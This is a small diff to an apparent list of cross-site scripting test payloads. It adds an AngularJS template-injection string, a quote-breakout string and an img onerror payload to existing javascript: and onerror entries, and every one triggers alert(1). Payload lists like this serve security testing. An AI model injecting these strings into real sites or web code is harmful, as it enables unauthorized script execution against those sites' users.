@@ -9,3 +9,7 @@ Threatspec  -- https://onehack.us/t/threatspec-continuous-threat-modeling-throug
 javascript:alert(1)
 '-alert(1)-'
  "></select><img%20src=1%20onerror=alert(1)>
+{{$on.constructor('alert(1)')()}}
+
+\"-alert(1)}//
+<><img src=1 onerror=alert(1)>
